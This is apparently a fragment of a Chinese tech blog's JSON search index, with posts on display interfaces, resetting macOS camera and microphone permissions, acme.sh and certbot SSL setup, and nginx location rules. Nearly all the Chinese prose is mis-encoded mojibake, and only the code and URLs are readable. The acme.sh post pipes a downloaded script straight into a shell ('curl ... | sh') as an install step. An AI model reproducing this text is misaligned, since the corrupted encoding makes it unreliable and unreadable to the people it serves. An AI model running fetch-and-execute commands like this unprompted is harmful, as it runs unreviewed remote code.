è¾“ã€å…¼å®¹æ€§è€ƒè™‘ï¼Œé¢„ç•™äº†ä¸å°‘å¼•è„šä»¥æ”¯æŒæ¨¡æ‹Ÿè®¾å¤‡ï¼Œé€ æˆæ¥å£ä½“ç§¯è¾ƒå¤§ã€‚ç›®å‰æ¯”è¾ƒå¥½çš„DVIæ¥å£èƒ½å¤Ÿä¼ è¾“2Kç”»é¢ï¼Œä½†ä¹ŸåŸºæœ¬æ˜¯æé™äº†ã€‚\n\n+ **HDMIæ¥å£**\n\n  é•¿çš„ç±»ä¼¼USB\n\n  HDMIæ—¢èƒ½ä¼ è¾“é«˜æ¸…å›¾å½¢ç”»é¢ä¿¡å·ï¼Œä¹Ÿèƒ½å¤Ÿä¼ è¾“éŸ³é¢‘ä¿¡å·ã€‚\n\n+ **DPæ¥å£**\n\n  DPæ¥å£ä¹Ÿæ˜¯ä¸€ç§é«˜æ¸…æ•°å­—æ˜¾ç¤ºæ¥å£æ ‡å‡†ï¼Œå¯ä»¥è¿æ¥ç”µè„‘å’Œæ˜¾ç¤ºå™¨ï¼Œä¹Ÿå¯ä»¥è¿æ¥ç”µè„‘å’Œå®¶åº­å½±é™¢ã€‚DPæ¥å£å¯ä»¥ç†è§£æ˜¯HDMIçš„åŠ å¼ºç‰ˆï¼Œåœ¨éŸ³é¢‘å’Œè§†é¢‘ä¼ è¾“æ–¹é¢æ›´åŠ å¼ºæ‚ã€‚\n\n  ç›®å‰æƒ…å†µä¸‹ï¼ŒDPä¸HDMIåœ¨æ€§èƒ½ä¸Šæ²¡æœ‰å¤šå¤§åŒºåˆ«ã€‚å¦‚æœä½ ä½¿ç”¨3840*2160åˆ†è¾¨ç‡ï¼ˆ4Kï¼‰ï¼ŒHDMIç”±äºå¸¦å®½ä¸è¶³ï¼Œæœ€å¤§åªèƒ½ä¼ é€30å¸§ï¼ŒDPå°±æ²¡æœ‰é—®é¢˜ã€‚\n\n+ å‚è€ƒèµ„æ–™\n\n  https://www.zhihu.com/question/19571221/answer/569037388\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://www.zhihu.com/question/19682094\n+ https://sspai.com/post/57549\n+ https://blog.haitianhome.com/macbook-2k-hidpi.html\n+ https://zhuanlan.zhihu.com/p/43249762","tags":["mac"],"categories":["ä½¿ç”¨"]},{"title":"macå¼€å¯æ‘„åƒå¤´å’Œéº¦å…‹é£æƒé™","url":"%2Fp%2F62e350b6.html","content":"\nmacæ— æ³•å¼€å¯æ‘„åƒå¤´å’Œéº¦å…‹é£æƒé™çš„è§£å†³æ–¹æ¡ˆã€‚\n\n<!-- more -->\n\n# 1. æ­£å¸¸å¼€å¯\n\nç”µè„‘->ç³»ç»Ÿåå¥½è®¾ç½®->å®‰å…¨æ€§ä¸éšç§->æ‘„åƒå¤´(éº¦å…‹é£)->ç‚¹å‡»ä¸‹é¢çš„é”, è§£å¼€, å³ä¾§ç‚¹å‡»åŠ å·æ·»åŠ appå³å¯ã€‚\n\nä½†æ˜¯å¦‚æœæ²¡æœ‰ + åŠ å·æŒ‰é’®æ·»åŠ ä¸€ä¸ªåº”ç”¨ï¼Œå°±éœ€è¦é‡ç½®æƒé™äº†ã€‚\n\n# 2. é‡ç½®æ‘„åƒå¤´å’Œéº¦å…‹é£æƒé™\n\n### 2.1 å¼€å¯csrutil\n\nä¿è¯csrutilå¼€å¯, åœ¨ç»ˆç«¯æ•²ä¸‹é¢å‘½ä»¤, ç¡®å®š enable, å¦‚æœä¸æ˜¯, éœ€è¦å¼€å¯\n\n```bash\ncsrutil status\n# System Integrity Protection status: disabled.\n```\n\n1 ï¼‰é‡å¯MACï¼ŒæŒ‰ä½cmd+Rç›´åˆ°å±å¹•ä¸Šå‡ºç°è‹¹æœçš„æ ‡å¿—å’Œè¿›åº¦æ¡ï¼Œè¿›å…¥Recoveryæ¨¡å¼ï¼›\n2 ï¼‰åœ¨å±å¹•æœ€ä¸Šæ–¹çš„å·¥å…·æ æ‰¾åˆ°å®ç”¨å·¥å…·ï¼ˆå·¦æ•°ç¬¬3ä¸ªï¼‰ï¼Œæ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥ï¼šcsrutil enableï¼›\n3 ï¼‰å…³æ‰ç»ˆç«¯ï¼Œé‡å¯macï¼›\n4ï¼‰ é‡å¯ä»¥åå¯ä»¥åœ¨ç»ˆç«¯ä¸­æŸ¥çœ‹çŠ¶æ€ç¡®è®¤ã€‚\n\n### 2.2 é‡ç½®æ“ä½œ\n\n```bash\ntccutil reset Camera\ntccutil reset Microphone\n```\n\n+ é”™è¯¯ä¿¡æ¯ tccutil: Usage: tccutil reset SERVICE [BUNDLE_ID]\n\n  åœ¨finderé‡Œæ‰“å¼€`~/Library/Application\\ Support/com.apple.TCC`,  æŠŠè¿™ä¸ªç©æ„æ‹–åˆ°åƒåœ¾ç®±é‡Œ, ç„¶åé‡å¯ç”µè„‘, å†æ¬¡æ‰§è¡Œä¸Šé¢çš„å‘½ä»¤\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://apple.stackexchange.com/questions/384317/how-do-i-reset-camera-and-microphone-permission-on-macos-mojave\n","tags":["mac"],"categories":["ä½¿ç”¨"]},{"title":"acme.shè‡ªåŠ¨æ›´æ–°SSLè¯ä¹¦","url":"%2Fp%2Fee822cec.html","content":"\n\n\n# 1. è¯ä¹¦ç±»å‹\n\n+ ç›®å‰ä¸»æµçš„SSLè¯ä¹¦ä¸»è¦åˆ†ä¸ºDV SSL(åŸŸåå‹) ã€ OV SSL(ç»„ç»‡å‹) ã€EV SSL(å¢å¼ºå‹)ã€‚\n\n![1](acme.shè‡ªåŠ¨æ›´æ–°SSLè¯ä¹¦/1.png)\n\n<!-- more -->\n\n+ DVã€OVã€EVè¯ä¹¦åœ¨æµè§ˆå™¨ä¸­æ˜¾ç¤ºçš„åŒºåˆ«\n\nDVç±»å‹ä»…åœ¨æµè§ˆå™¨æ˜¾ç¤ºä¸€ä¸ªå°é”ï¼ŒOVå’ŒEVç±»å‹è¯ä¹¦éƒ½åŒ…å«äº†ä¼ä¸šåç§°ä¿¡æ¯ï¼Œä½†æ˜¯ï¼ŒEVè¯ä¹¦é‡‡ç”¨äº†æ›´åŠ ä¸¥æ ¼çš„è®¤è¯æ ‡å‡†ï¼Œæµè§ˆå™¨åœ¨è®¿é—®æ—¶ï¼Œä¼šåœ¨åœ°å€æ æ˜¾ç¤ºå…¬å¸åç§°ï¼Œåœ°å€æ å˜æˆç»¿è‰²ã€‚ç»¿çš„æ›´åŠ è®©äººä¿¡ä»»ã€‚\n\n![1](acme.shè‡ªåŠ¨æ›´æ–°SSLè¯ä¹¦/2.png)\n\n\n\n# 2. ACMEåè®®\n\nACMEå…¨ç§°The Automatic Certificate Management Environmentï¼Œè€Œ[acme.sh](https://link.jianshu.com/?t=https%3A%2F%2Fgithub.com%2FNeilpang%2Facme.sh)è¿™ä¸ªåº“ï¼Œåˆ™èƒ½å¤Ÿåœ¨Linuxä¸Šå®ç°å¦‚ä¸‹åŠŸèƒ½ï¼š\n\n1. è‡ªåŠ¨å‘Let's Encryptç”³è¯·è¯ä¹¦ï¼›\n2. è‡ªåŠ¨è°ƒç”¨å„å¤§äº‘å¹³å°çš„apiæ¥å£å®ç°TXTè§£æé…ç½®ï¼›\n3. è¯ä¹¦ä¸‹å‘åè‡ªåŠ¨éƒ¨ç½²åˆ°nginxï¼›\n4. åˆ©ç”¨å®šæ—¶å™¨ï¼Œæ¯60å¤©è‡ªåŠ¨æ›´æ–°è¯ä¹¦ï¼Œå¹¶å®Œæˆè‡ªåŠ¨éƒ¨ç½²ã€‚\n\n\n\n# 3. é…ç½®è¯ä¹¦\n\n### 3.1 å®‰è£…acme.sh\n\n```bash\ncurl https://get.acme.sh | sh\n```\n\nè¿™ä¸ªè‡ªåŠ¨å®‰è£…è¿‡ç¨‹å®Œæˆäº†ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š\n\n1. æ‹·è´shè„šæœ¬åˆ°~/.acme.sh/\n2. åˆ›å»ºaliasåˆ«åacme.sh=~/.acme.sh/acme.sh   (`source ~/.bashrc`ä¸€ä¸‹)\n3. å¯åŠ¨å®šæ—¶å™¨ . å¯ä»¥é€šè¿‡`crontab -l`æŸ¥çœ‹\n\n\n\n### 3.2 dnséªŒè¯å¹¶å®‰è£…éƒ¨ç½²\n\nacme.sh å®ç°äº† acme åè®®æ”¯æŒçš„æ‰€æœ‰éªŒè¯åè®®. ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼éªŒè¯: http å’Œ dns éªŒè¯. æ¥ä¸‹æ¥æˆ‘ä»¬è¯´ä¸‹ dnsçš„éªŒè¯.\n\n+ å»é˜¿é‡Œçš„æ§åˆ¶å°æ‰¾åˆ°Ali_Key, Ali_Secret, æ‰§è¡Œä¸‹é¢å‘½å\n\n  ```bash\n  export Ali_Key=\"xxxxxxxx\" \n  export Ali_Secret=\"xxxxxxxx\"\n  ```\n\n+ ç”Ÿæˆæ³›åŸŸåè¯ä¹¦\n\n  ```bash\n  acme.sh --issue -d \"*.liuvv.com\" --dns dns_ali\n  ```\n  åœ¨`~/.acme`æ–‡ä»¶é‡Œç”Ÿæˆäº†`*.liuvv.com` æ–‡ä»¶å¤¹\n\n+ é…ç½®nginx\n\n  ```nginx\n  server {\n          listen 80 default_server;\n          listen [::]:80 default_server;\n          rewrite ^ https://$http_host$request_uri? permanent; #httpsè·³è½¬åˆ°https,æ°¸ä¹…é‡å®šå‘\n  }\n  \n  server {\n          listen 443 ssl default_server;\n          listen [::]:443 ssl default_server;\n  \n          ssl_certificate \"/etc/nginx/ssl/fullchain.cer\";\n          ssl_certificate_key \"/etc/nginx/ssl/*.liuvv.com.key\";\n  \n          root /home/levonfly/www;\n          index index.html;\n  }\n  ```\n\n  \n\n+ å®‰è£…è¯ä¹¦\n\n  ```bash\n  sudo ./acme.sh  --installcert  -d  *.liuvv.com   \\\n          --key-file   /etc/nginx/ssl/*.liuvv.com.key \\\n          --fullchain-file /etc/nginx/ssl/fullchain.cer \\\n          --reloadcmd  \"service nginx force-reload\"\n  ```\n\n  + è¿™é‡Œç”¨çš„æ˜¯ `service nginx force-reload`, ä¸æ˜¯ `service nginx reload`, æ®æµ‹è¯•, `reload` å¹¶ä¸ä¼šé‡æ–°åŠ è½½è¯ä¹¦, æ‰€ä»¥ç”¨çš„ `force-reload`\n  + nginx çš„é…ç½® `ssl_certificate` ä½¿ç”¨ `/etc/nginx/ssl/fullchain.cer` ï¼Œè€Œé `/etc/nginx/ssl/<domain>.cer` ï¼Œå¦åˆ™ [SSL Labs](https://www.ssllabs.com/ssltest/) çš„æµ‹è¯•ä¼šæŠ¥ `Chain issues Incomplete` é”™è¯¯ã€‚\n\n+ é‡æ–°ç”Ÿæˆè¯ä¹¦\n\n  ```bash\n  sudo ./acme.sh --renew -d *.liuvv.com --force\n  ```\n\n  é€šè¿‡è¿™ä¸ªå‘½ä»¤,è§‚çœ‹æ˜¯å¦è‡ªåŠ¨éƒ¨ç½², å¹¶è§‚å¯Ÿè¯ä¹¦çš„åˆ°æœŸæ—¶é—´.\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ [https://github.com/Neilpang/acme.sh/wiki/%E8%AF%B4%E6%98%8E](https://github.com/Neilpang/acme.sh/wiki/è¯´æ˜)\n\n+ https://www.mustu.cn/acme-shhuo-qu-lets-encrypt-wildcardtong-pei-ssl/\n\n+ https://www.jianshu.com/p/a9f2088e099c\n\n+ https://deepzz.com/post/acmesh-letsencrypt-cert-auto-renew.html","tags":["acme.sh"],"categories":["https"]},{"title":"è®©è‡ªå·±çš„ç½‘ç«™æ”¯æŒhttps","url":"%2Fp%2Ffcd8becb.html","content":"\n# 1. certbot\n\n+ ä½¿ç”¨ Letâ€™s Encrypt æä¾›çš„å…è´¹è¯ä¹¦, æ”¾åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸­, å¹¶ä¸”åœ¨nginxé…ç½®å¥½è¯ä¹¦è·¯å¾„, è¿™æ ·ä½¿ç”¨æµè§ˆå™¨è®¿é—®çš„æ—¶å€™å°±ä¼šè§åˆ°ç†Ÿæ‚‰çš„ç»¿è‰²å°é”å¤´äº†. éœ€è¦æ³¨æ„è¯ä¹¦å¿…é¡»é¢å‘ç»™`æŸä¸ªåŸŸå`, æ‰€ä»¥`ipåœ°å€`æ— æ•ˆ.\n\n+ å®‰è£…å·¥å…·certbot\n\n```\ngit clone https://github.com/certbot/certbot\ncd certbot\nchmod +x certbot-auto\n\t\n# certbot-auto å³ä¸ºè‡ªåŠ¨åŒ–è„šæœ¬å·¥å…·, ä»–ä¼šåˆ¤æ–­ä½ çš„æœåŠ¡æ˜¯nginxè¿˜æ˜¯apache, ç„¶åæ‰§è¡Œå¯¹åº”é€»è¾‘\n./certbot-auto --help\n```\n<!-- more -->\n\n+ ç”Ÿæˆè¯ä¹¦\n\n```bash\n# webrootä»£è¡¨webrootæ ¹ç›®å½•æ¨¡å¼, certonlyä»£è¡¨åªç”Ÿæˆè¯ä¹¦ é‚®ç®±äº²æµ‹æ²¡å•¥å¤§ç”¨, åŸŸåä¸€å®šè¦å’Œè‡ªå·±è¦ç”³è¯·è¯ä¹¦çš„åŸŸåä¸€è‡´\n./certbot-auto certonly --webroot --agree-tos -v -t --email ä½ çš„é‚®ç®± -w æœåŠ¡å™¨æ ¹ç›®å½• -d ä½ è¦ç”³è¯·çš„åŸŸå\n\t\n\t\n# å®é™…å¦‚ä¸‹\n./certbot-auto certonly --webroot --agree-tos -v -t --email levonfly@gmail.com -w /var/www/html/ -d a.xuanyueting.com\n```\n\nç„¶åä¼šåœ¨/etc/letsencrypt/ç›®å½•ä¸‹ç”Ÿæˆç›¸å…³æ–‡ä»¶, ä½ æ‰€éœ€è¦çš„è¯ä¹¦å…¶å®åœ¨`/etc/letsencrypt/live/a.xuanyueting.com/`ç›®å½•ä¸­.\n\n`fullchain.pem`å¯ä»¥çœ‹ä½œæ˜¯è¯ä¹¦å…¬é’¥, `privkey.pem`æ˜¯è¯ä¹¦ç§é’¥, æ˜¯æˆ‘ä»¬ä¸‹é¢éœ€è¦ä½¿ç”¨åˆ°çš„ä¸¤ä¸ªæ–‡ä»¶\n\n\n+ nginx é…ç½®æ”¯æŒ https\n\n```nginx\nserver {\n    listen 80 default_server;\n    listen [::]:80 default_server;\n    rewrite ^ https://$http_host$request_uri? permanent;\n}\n\n\nserver {\n\t  listen 443 ssl default_server;\n    listen [::]:443 ssl default_server;\n    ssl_certificate \"/etc/letsencrypt/live/a.xuanyueting.com/fullchain.pem\";\n    ssl_certificate_key \"/etc/letsencrypt/live/a.xuanyueting.com/privkey.pem\";\n    \n    root /var/www/html;\n    ....\n}\n```\n\n+ é‡å¯ nginx éªŒè¯\n```bash\nsudo service nginx restart\n```\nè®¿é—® a.xuanyueting.com, ä¼šå‘ç°å‡ºç°äº†å°ç»¿é”\n\n\n\n# 2. acmeè‡ªåŠ¨ç”Ÿæˆå¹¶æ›´æ–°è¯ä¹¦\n\n+ https://www.liuvv.com/p/ee822cec.html\n\n\n\n# 3. freesnç½‘ç«™å…è´¹ç”³è¯·\n\n+ https://freessl.cn/ æ³¨å†Œè´¦å·\n\n+ é€‰æ‹©Let's Encrypt V2 æ”¯æŒé€šé…ç¬¦\n\n  ![1](è®©è‡ªå·±çš„ç½‘ç«™æ”¯æŒhttps/1.png)\n\n+ å¯åŠ¨keymanager(éœ€è¦ä¸‹è½½), è®¾ç½®ä¸€ä¸ªå¯†ç \n\n+ æµè§ˆå™¨æ‹‰èµ·keymanager, ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªcsr\n\n+ DNS éªŒè¯\n\n  ![1](è®©è‡ªå·±çš„ç½‘ç«™æ”¯æŒhttps/2.png)\n\n  CA å°†é€šè¿‡æŸ¥è¯¢ DNS çš„ TXT è®°å½•æ¥ç¡®å®šæ‚¨å¯¹è¯¥åŸŸåçš„æ‰€æœ‰æƒã€‚æ‚¨åªéœ€è¦åœ¨åŸŸåç®¡ç†å¹³å°å°†ç”Ÿæˆçš„ TXT è®°å½•åä¸è®°å½•å€¼æ·»åŠ åˆ°è¯¥åŸŸåä¸‹ï¼Œç­‰å¾…å¤§çº¦ 1 åˆ†é’Ÿå³å¯éªŒè¯æˆåŠŸã€‚\n\n  \n\n  éœ€è¦ä½ åˆ°ä½ çš„åŸŸåæ‰˜ç®¡æœåŠ¡å•†é‚£é‡Œæ·»åŠ ä¸€æ¡ TXT è®°å½•ï¼Œå…¶ä¸­è®°å½•åç§°ä¸ºç¬¬äºŒè¡Œçš„å†…å®¹,è®°å½•å€¼ä¸ºç¬¬ä¸‰è¡Œçš„å†…å®¹ã€‚\n\n  ![1](è®©è‡ªå·±çš„ç½‘ç«™æ”¯æŒhttps/3.png)\n\n+ ç”Ÿæˆè¯ä¹¦å¹¶ä¸”ä¸‹è½½, å»ºè®®ä¿å­˜åˆ°key manageré‡Œ\n\t![1](è®©è‡ªå·±çš„ç½‘ç«™æ”¯æŒhttps/4.png)\n\n+ ä¿å­˜åˆ°key manageré‡Œ, æœ‰æ•ˆæœŸ3ä¸ªæœˆ, é€‰æ‹©å¯¼å‡ºè¯ä¹¦, nginx, 2ä¸ªæ–‡ä»¶crt å’Œ key\n  ![1](è®©è‡ªå·±çš„ç½‘ç«™æ”¯æŒhttps/5.png)\n  \n+ Nginx é…ç½®\n\n  ```nginx\n  server {\n          listen 80 default_server;#ä¸€å®šè¦åŠ ä¸Šdefault_server,å¦åˆ™å¤šä¸ªserverä¼šæ‰¾ç¬¬ä¸€ä¸ªä¸ºé»˜è®¤\n          listen [::]:80 default_server;#ç›‘å¬æ‰€æœ‰çš„ipv6çš„åœ°å€\n          rewrite ^ https://$http_host$request_uri? permanent; #https è·³è½¬åˆ° https,æ°¸ä¹…é‡å®šå‘å‘\n  }\n  server {\n          listen 443 ssl default_server;\n          listen [::]:443 ssl default_server;\n          ssl_certificate \"/etc/nginx/ssl/*.liuvv.com_chain.crt\";\n          ssl_certificate_key \"/etc/nginx/ssl/*.liuvv.com_key.key\";\n          root /home/levonfly/www;\n          index index.html;\n  }\n  ```\n\n","tags":["http"],"categories":["https"]},{"title":"nginxçš„locationå’Œrewriteä½¿ç”¨è§„åˆ™","url":"%2Fp%2F51e59d76.html","content":"\n# 0. å‰è¨€\n\nuriæ˜¯urlä¸­é™¤å»åè®®\bå’ŒåŸŸååŠå‚æ•°å, å‰©ä¸‹çš„éƒ¨åˆ†.\n\næ¯”å¦‚è¯·æ±‚çš„urlä¸º: http://www.liuvv.com/test/index.php?page=1, åˆ™uri ä¸º `/test/index.php`\n\n<!-- more -->\n\n# 1. locationæŒ‡ä»¤\n\n### 1.1 locationåŒ¹é…uriçš„è§„åˆ™\n\n```\nlocation [ = | ~ | ~* | ^~ ] uri { ... }\n```\n\n+ `=`  ç²¾ç¡®åŒ¹é…, uriè¦å®Œå…¨ä¸€æ ·\n+ `^~`  è¿™ä¸ªæ˜¯ä»¥æŸä¸ªå¼€å¤´, ä¸æ˜¯æ­£åˆ™åŒ¹é…\n+ `~`  åŒºåˆ†å¤§å°å†™æ­£åˆ™åŒ¹é…\n+ `~*` ä¸åŒºåˆ†å¤§å°å†™æ­£åˆ™åŒ¹é…\n\n\n\n### 1.2 locationåŒ¹é…uriçš„ä¼˜å…ˆçº§\n\n1. é¦–å…ˆå…ˆæ£€æŸ¥ä½¿ç”¨å‰ç¼€å­—ç¬¦å®šä¹‰çš„locationï¼Œé€‰æ‹©æœ€é•¿åŒ¹é…çš„é¡¹å¹¶è®°å½•ä¸‹æ¥ã€‚\n\n2. å¦‚æœæ‰¾åˆ°äº†ç²¾ç¡®åŒ¹é…çš„locationï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨äº†`=`ä¿®é¥°ç¬¦çš„locationï¼Œç»“æŸæŸ¥æ‰¾ï¼Œä½¿ç”¨å®ƒçš„é…ç½®ã€‚\n\n3. å¦‚æœ`^~`ä¿®é¥°ç¬¦å…ˆåŒ¹é…åˆ°æœ€é•¿çš„å‰ç¼€å­—ç¬¦ä¸², åˆ™ä¸æ£€æŸ¥æ­£åˆ™ã€‚\n\n4. ç„¶åæŒ‰é¡ºåºæŸ¥æ‰¾ä½¿ç”¨æ­£åˆ™å®šä¹‰çš„locationï¼Œå¦‚æœåŒ¹é…åˆ™åœæ­¢æŸ¥æ‰¾ï¼Œä½¿ç”¨å®ƒå®šä¹‰çš„é…ç½®ã€‚\n\n5. å¦‚æœæ²¡æœ‰åŒ¹é…çš„æ­£åˆ™locationï¼Œåˆ™ä½¿ç”¨å‰é¢è®°å½•çš„æœ€é•¿åŒ¹é…å‰ç¼€å­—ç¬¦locationã€‚\n\n   \n\n> åŸºäºä»¥ä¸Šçš„åŒ¹é…è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä»¥ä¸‹å¯ç¤ºï¼š\n\n1. ä½¿ç”¨æ­£åˆ™å®šä¹‰çš„locationåœ¨é…ç½®æ–‡ä»¶ä¸­å‡ºç°çš„é¡ºåºå¾ˆé‡è¦ã€‚å› ä¸ºæ‰¾åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…çš„æ­£åˆ™åï¼ŒæŸ¥æ‰¾å°±åœæ­¢äº†ï¼Œåé¢å®šä¹‰çš„æ­£åˆ™å°±æ˜¯å†åŒ¹é…ä¹Ÿæ²¡æœ‰æœºä¼šäº†ã€‚\n2. ä½¿ç”¨ç²¾ç¡®åŒ¹é…å¯ä»¥æé«˜æŸ¥æ‰¾çš„é€Ÿåº¦ã€‚ä¾‹å¦‚ç»å¸¸è¯·æ±‚`/`çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨`=`æ¥å®šä¹‰locationã€‚\n3. ä¼˜å…ˆçº§ `=`  >  `^~`  >  æ­£åˆ™\n\n\n\n### 1.3 \u0010location æµ‹è¯•\n\n```nginx\nlocation = / {\n  return 502 \"è§„åˆ™A\\n\";\n}\nlocation = /login {\n  return 502 \"è§„åˆ™B\\n\";\n}\nlocation ^~ /static/ {\n  return 502 \"è§„åˆ™C\\n\";\n}\nlocation ^~ /static/files {\n  return 502 \"è§„åˆ™D\\n\";\n}\nlocation ~ \\.(gif|jpg|png|js|css)$ {\n  return 502 \"è§„åˆ™E\\n\";\n}\nlocation ~* \\.PNG$ {\n  return 502 \"è§„åˆ™F\\n\";\n}\nlocation /img {\n  return 502 \"è§„åˆ™G\\n\";\n}\nlocation / {\n  return 502 \"è§„åˆ™H\\n\";\n}\n```\n\næµ‹è¯•ç»“æœ:\n\n```bash\nlevonfly@hk:~$ curl test.liuvv.com # å› ä¸ºæ˜¯=\nè§„åˆ™A\nlevonfly@hk:~$ curl test.liuvv.com/ # å› ä¸ºæ˜¯=\nè§„åˆ™A\nlevonfly@hk:~$ curl test.liuvv.com/login # å› ä¸ºæ˜¯=\nè§„åˆ™B\nlevonfly@hk:~$ curl test.liuvv.com/login/ # å¤šäº†/, å‚è€ƒä¸‹é¢3.5\nè§„åˆ™H\nlevonfly@hk:~$ curl test.liuvv.com/abc\nè§„åˆ™H\n\nlevonfly@hk:~$ curl test.liuvv.com/static/a.html \nè§„åˆ™C\nlevonfly@hk:~$ curl test.liuvv.com/static/files/a.html # æ›´åŠ ç²¾å‡†\nè§„åˆ™D\n\nlevonfly@hk:~$ curl test.liuvv.com/a.png # æ­£åˆ™ç²¾å‡†\nè§„åˆ™E\nlevonfly@hk:~$ curl test.liuvv.com/a.PNG # æ­£åˆ™ç²¾å‡†\nè§„åˆ™F\nlevonfly@hk:~$ curl test.liuvv.com/static/a.png # ^~ ä¼˜å…ˆçº§æ›´é«˜\nè§„åˆ™C\n\nlevonfly@hk:~$ curl test.liuvv.com/img/a.gif #æ­£åˆ™åŒ¹é…ä¼˜å…ˆ\nè§„åˆ™E\nlevonfly@hk:~$ curl test.liuvv.com/img/a.tiff\nè§„åˆ™G\nlevonfly@hk:~$ curl test.liuvv.com/abc/123/haha #ä»€ä¹ˆéƒ½åŒ¹é…ä¸åˆ°, å°±åˆ°H\nè§„åˆ™H\n```\n\n\n\n### 1.4 location @nameçš„ç”¨æ³•\n\n@ç”¨æ¥å®šä¹‰ä¸€ä¸ªå‘½ålocationã€‚ä¸»è¦ç”¨äºå†…éƒ¨é‡å®šå‘ï¼Œä¸èƒ½ç”¨æ¥å¤„ç†æ­£å¸¸çš„è¯·æ±‚ã€‚å…¶ç”¨æ³•å¦‚ä¸‹ï¼š\n\n```nginx\nlocation / {\n    try_files $uri $uri/ @custom\n}\nlocation @custom {\n    # ...do something\n}\n```\n\nä¸Šä¾‹ä¸­ï¼Œå½“å°è¯•è®¿é—®urlæ‰¾ä¸åˆ°å¯¹åº”çš„æ–‡ä»¶å°±é‡å®šå‘åˆ°æˆ‘ä»¬è‡ªå®šä¹‰çš„å‘½ålocationï¼ˆæ­¤å¤„ä¸ºcustomï¼‰ã€‚\n\nå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå‘½ålocationä¸­ä¸èƒ½å†åµŒå¥—å…¶å®ƒçš„å‘½ålocationã€‚\n\n\n\n\n### 1.5 rootå’Œaliasçš„åŒºåˆ«\n\nnginxæŒ‡å®šæ–‡ä»¶è·¯å¾„æœ‰ä¸¤ç§æ–¹å¼rootå’Œalias.\n\n- root\n\n```\n[root]\nè¯­æ³•ï¼šroot path\né»˜è®¤å€¼ï¼šroot html\né…ç½®æ®µï¼šhttpã€serverã€locationã€if\n```\n\nä¾‹å¦‚:\n\n```nginx\nlocation ^~ /t/ { \n     root /www/root/html/;\n}\n```\n\nå¦‚æœä¸€ä¸ªè¯·æ±‚çš„URIæ˜¯/t/a.htmlæ—¶ï¼ŒwebæœåŠ¡å™¨å°†ä¼šè¿”å›æœåŠ¡å™¨ä¸Šçš„/www/root/html/t/a.htmlçš„æ–‡ä»¶ã€‚\n\n- alias\n\n```\n[alias]\nè¯­æ³•ï¼šalias path\né…ç½®æ®µï¼šlocation\n```\n\nä¾‹å¦‚:\n\n```nginx\nlocation ^~ /t/ { # ç‰¹æ®Šçš„è§„åˆ™æ˜¯, aliaså¿…é¡»ä»¥\"/\" ç»“æŸ\n alias /www/root/html/new_t/;\n}\n```\n\nå¦‚æœä¸€ä¸ªè¯·æ±‚çš„URIæ˜¯/t/a.htmlæ—¶ï¼ŒwebæœåŠ¡å™¨å°†ä¼šè¿”å›æœåŠ¡å™¨ä¸Šçš„/www/root/html/new_t/a.htmlçš„æ–‡ä»¶ã€‚æ³¨æ„è¿™é‡Œæ˜¯new_tï¼Œå› ä¸ºaliasä¼šæŠŠlocationåé¢é…ç½®çš„è·¯å¾„ä¸¢å¼ƒæ‰ï¼ŒæŠŠå½“å‰åŒ¹é…åˆ°çš„ç›®å½•æŒ‡å‘åˆ°æŒ‡å®šçš„ç›®å½•ã€‚\n\n\n\n### 1.6 nginxæ˜¾ç¤ºç›®å½•ç»“æ„\n\nnginxé»˜è®¤æ˜¯ä¸å…è®¸åˆ—å‡ºæ•´ä¸ªç›®å½•çš„ã€‚å¦‚éœ€æ­¤åŠŸèƒ½, åœ¨serveræˆ–location æ®µé‡Œæ·»åŠ ä¸Šautoindex on;\n\n```nginx\nautoindex_exact_size off;\né»˜è®¤ä¸ºonï¼Œæ˜¾ç¤ºå‡ºæ–‡ä»¶çš„ç¡®åˆ‡å¤§å°ï¼Œå•ä½æ˜¯bytesã€‚\næ”¹ä¸ºoffåï¼Œæ˜¾ç¤ºå‡ºæ–‡ä»¶çš„å¤§æ¦‚å¤§å°ï¼Œå•ä½æ˜¯kBæˆ–è€…MBæˆ–è€…GB\n\nautoindex_localtime on;\né»˜è®¤ä¸ºoffï¼Œæ˜¾ç¤ºçš„æ–‡ä»¶æ—¶é—´ä¸ºGMTæ—¶é—´ã€‚\næ”¹ä¸ºonåï¼Œæ˜¾ç¤ºçš„æ–‡ä»¶æ—¶é—´ä¸ºæ–‡ä»¶çš„æœåŠ¡å™¨æ—¶é—´\n```\n\nå¯ä»¥ä¸‹é¢çš„ä¾‹å­:\n\n```nginx\nlocation ^~ \"/upload-preview\" {\n\t\talias /tmp/cistern/;\n\t\tautoindex on;\n\t\tautoindex_localtime on;\n}\n```\n\n\n\n### 1.7 URLå°¾éƒ¨çš„`/`éœ€ä¸éœ€è¦\n\n+ å¦‚æœURLç»“æ„æ˜¯`https://domain.com/`çš„å½¢å¼ï¼Œå°¾éƒ¨æœ‰æ²¡æœ‰`/`éƒ½ä¸ä¼šé€ æˆé‡å®šå‘ã€‚å› ä¸ºæµè§ˆå™¨åœ¨å‘èµ·è¯·æ±‚çš„æ—¶å€™ï¼Œé»˜è®¤åŠ ä¸Šäº†`/`ã€‚è™½ç„¶å¾ˆå¤šæµè§ˆå™¨åœ¨åœ°å€æ é‡Œä¹Ÿä¸ä¼šæ˜¾ç¤º`/`ã€‚è¿™ä¸€ç‚¹ï¼Œå¯ä»¥è®¿é—®[baidu](https://www.baidu.com/)éªŒè¯ä¸€ä¸‹ã€‚\n\n+ å¦‚æœURLçš„ç»“æ„æ˜¯`https://domain.com/some-dir/`ã€‚\n\n  å°¾éƒ¨å¦‚æœç¼ºå°‘`/`å°†å¯¼è‡´é‡å®šå‘ã€‚å› ä¸ºæ ¹æ®çº¦å®šï¼ŒURLå°¾éƒ¨çš„`/`è¡¨ç¤ºç›®å½•ï¼Œæ²¡æœ‰`/`è¡¨ç¤ºæ–‡ä»¶ã€‚\n  \n  